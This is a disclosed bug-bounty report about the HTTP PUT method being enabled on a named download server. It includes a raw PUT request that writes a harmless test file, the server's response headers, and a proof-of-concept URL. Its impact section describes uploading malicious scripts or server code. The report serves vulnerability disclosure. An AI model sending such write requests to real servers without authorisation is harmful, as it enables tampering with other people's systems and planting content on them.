# HTTP PUT method is enabled downloader.ratelimited.me

## Report Details
- **Report ID**: 545136
- **URL**: https://hackerone.com/reports/545136
- **State**: Closed
- **Severity**: high
- **Submitted**: 2019-04-22T13:20:39.552Z
- **Disclosed**: 2022-08-07T02:01:13.793Z

## Reporter
- **Username**: codeslayer1337
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ratelimited

## Vulnerability Information
## Summary:
Found on HTTP PUT sites enabled on web servers. I tried testing to write the file / codelayer137.txt uploaded to the server using the PUT verb, and the contents of the file were then taken using the GET verb

## Steps To Reproduce:
Request:
PUT /codeslayer137.txt HTTP/1.1
Host: downloader.ratelimited.me
Content-Length: 21
Connection: close

Testing By CodeSlayer

Response:
HTTP/1.1 200 OK
Date: Mon, 22 Apr 2019 13:10:13 GMT
Content-Type: download/thisfile
Content-Length: 0
Connection: close
Set-Cookie: __cfduid=d5508aeb63f9590d9be26bcccc049fdbf1555938612; expires=Tue, 21-Apr-20 13:10:12 GMT; path=/; domain=.ratelimited.me; HttpOnly; Secure
Accept-Ranges: bytes
Content-Security-Policy: block-all-mixed-content
Etag: "59448a863a8dbff84de1cf4f03c8e9cf"
Vary: Origin
X-Amz-Request-Id: 1597CDECEA82CBA5
X-Minio-Deployment-Id: ebc7a0d8-9f47-4bdb-92ee-4a9cbbd3ec48
X-Xss-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-Content-Type-Options: nosniff
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Server: cloudflare
CF-RAY: 4cb7d629decba9a2-SIN




POC: https://download.ratelimited.me/codeslayer137.txt

## Impact

The HTTP PUT method is normally used to upload data that is saved on the server at a user-supplied URL. If enabled, an attacker may be able to place arbitrary, and potentially malicious, content into the application. Depending on the server's configuration, this may lead to compromise of other users (by uploading client-executable scripts), compromise of the server (by uploading server-executable code), or other attacks.

## Attachments
- PUT.png
- url.png
